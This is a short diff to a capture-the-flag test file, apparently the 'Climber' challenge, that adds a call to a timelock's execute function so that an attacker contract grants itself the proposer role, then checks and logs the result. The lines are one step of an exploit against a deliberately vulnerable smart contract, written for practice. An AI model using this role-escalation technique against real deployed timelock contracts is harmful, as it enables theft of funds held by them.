@@ -108,6 +108,17 @@ describe("[Challenge] Climber", function () {
     dataElements.push(data3);
     console.log(dataElements);
     await climberAttack.addData(dataElements);
+    //Call execute function on timeLock to run prepared calldata
+    //Ensure climberAttack contract is granted propser role
+    await timelock.execute(
+      [timelock.address, timelock.address, climberAttack.address],
+      values,
+      dataElements,
+      salt
+    );
+    await climberAttack.checkRole();
+    let hasRole = await climberAttack.hasRole();
+    console.log(hasRole);
   });
 
   after(async function () {
